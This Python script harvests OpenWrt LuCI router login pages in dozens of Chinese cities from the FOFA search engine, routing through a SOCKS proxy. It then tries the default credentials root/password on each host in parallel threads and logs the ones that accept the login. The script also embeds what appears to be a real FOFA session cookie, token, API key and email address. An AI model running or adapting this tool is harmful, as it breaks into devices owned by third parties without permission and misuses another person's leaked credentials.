import requests
import base64
import json
from lxml import etree
import urllib3
import time
import threading

# 忽略警告加这2行
from urllib3 import disable_warnings
disable_warnings()

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Cookie': '_ga=GA1.1.2042238439.1668561172; __fcd=a3OMyL8fcSoN2vC6UljEvn7w; is_flag_login=0; isRedirect=1; Hm_lvt_19b7bde5627f2f57f67dfb76eedcf989=1675668876,1676210006,1676538914,1676853459; befor_router=%2F; fofa_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MjE2NjYyLCJtaWQiOjEwMDEyNDU4NywidXNlcm5hbWUiOiJzZGRkZmVyIiwiZXhwIjoxNjc3MTEyNjkzfQ.n1gYIQcvmAFc1O8-Xnk7NER2Dd07HE9gCRb-4_Ofd5jDjRqjO4AJHldTqvjZHmtyRpPLgBgdR-_wOEPbYq9QgQ; user=%7B%22id%22%3A216662%2C%22mid%22%3A100124587%2C%22is_admin%22%3Afalse%2C%22username%22%3A%22sdddfer%22%2C%22nickname%22%3A%22sdddfer%22%2C%22email%22%3A%22l484564845%40qq.com%22%2C%22avatar_medium%22%3A%22https%3A%2F%2Fnosec.org%2Fmissing.jpg%22%2C%22avatar_thumb%22%3A%22https%3A%2F%2Fnosec.org%2Fmissing.jpg%22%2C%22key%22%3A%2258eca2b9c77d38189d54f5c3716da734%22%2C%22rank_name%22%3A%22%E6%B3%A8%E5%86%8C%E7%94%A8%E6%88%B7%22%2C%22rank_level%22%3A0%2C%22company_name%22%3A%22sdddfer%22%2C%22coins%22%3A0%2C%22can_pay_coins%22%3A0%2C%22credits%22%3A1%2C%22expiration%22%3A%22-%22%2C%22login_at%22%3A1676853493%7D; Hm_lpvt_19b7bde5627f2f57f67dfb76eedcf989=1676853496; _ga_9GWBD260K9=GS1.1.1676853458.27.1.1676853496.0.0.'
}

login_data = {
    'luci_username': 'root',
    'luci_password': 'password',
}


base_url = 'https://fofa.info/result?qbase64={}&page={}&page_size=20'
query_city = ['huzhou', 'hangzhou', 'ganzhou', 'beijing',  'shanghai', 'guangzhou','shenzhen', 'chengdu', 'suzhou','nanjing', 'chongqing', 'wuhan', 'tianjin', 'Xi\'an', 'qingdao', 'zhengzhou', 'ningbo', 'hefei','wuxi','xiamen', 'fuzhou', 'jinan', 'dalian', 'kunming', 'changchun', 'foshan', 'dongguan', 'quanzhou', 'wenzhou', 'guiyang', 'nanning', 'nanchang', 'changzhou',  'nantong', 'zhuhai', 'yantai', 'shaoxing', 'jiaxing', 'huizhou', 'taiyuan', 'tangshan', 'jinhua', 'weifang','taizhou', 'zhongshan', 'yangzhou', 'lanzhou', 'xuzhou', 'zhenjiang', ]

  
proxies = {'http': "socks5://127.0.0.1:7890",
           'https': "socks5://127.0.0.1:7890"}
 

def get_login(url, serach_time, city):
    login_url = url + '/cgi-bin/luci'
    try:
        login_res = requests.post(url=login_url, data=login_data, verify=False, proxies=proxies)
        if login_res.status_code == 200:
            print('*'*50)
            print(login_res.status_code)
            print(login_url)
            print('*'*50)
            with open('{}.txt'.format(serach_time), 'a+') as f:
                f.write(url + '\t' + city + '\n')
        elif login_res.status_code == 403:
            print("ERROR: Password is Wrong!\t" + str(login_url))
        else:
            print("找不到在哪!\t" + str(login_url))
    except Exception as e:
        print("Exception: " + str(login_url))
        # print(e)      

 

def get_urls():
    query_time = time.strftime("%Y-%m-%d")

    for city in query_city[:]:
        search_query = base64.b64encode('title="LUCI" && country="CN" && city="{}" && before="{}"'.format(city, query_time).encode("utf-8"))
        for page in range(1, 4):
            print('#'*50)
            print('当前城市:{}\t当前页数:{}'.format(city, page))
            print('#'*50)
            print(base_url.format(bytes.decode(search_query), page))
            reponse = requests.get(url=base_url.format(bytes.decode(search_query), page), headers=headers, proxies=proxies)
            # print(reponse.text)
            htmltext = etree.HTML(reponse.text)
            # sel = htmltext.xpath('//div[@class="result-item"]//div[@class="addrLeft"]//span//a/text()')
            sel = htmltext.xpath('//div[@class="el-checkbox-group"]//div[contains(@class, "hsxa-meta-data-list-lv1")]/span/a/text()')
            
            thread_list = []
            for xui_url in sel[:]:
                xui_url = xui_url.strip()
                if 'http' not in xui_url:
                    xui_url = 'http://' + xui_url
                thr = threading.Thread(target=get_login, args=(xui_url, query_time, city, ))
                thread_list.append(thr)
            for thr in thread_list:
                thr.start()

get_urls()

# get_login('http://14.118.229.114:1000', '123')